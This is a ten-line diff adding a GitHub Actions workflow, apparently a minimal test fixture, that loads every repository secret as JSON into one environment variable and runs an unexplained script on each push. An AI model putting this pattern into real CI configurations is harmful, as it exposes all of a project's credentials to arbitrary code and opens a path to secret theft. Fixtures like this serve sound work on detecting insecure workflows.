@@ -1,0 +1,10 @@
+name: ci
+on: push
+permissions: {}
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          ALL: ${{ toJson(secrets) }}
+        run: ./x.sh
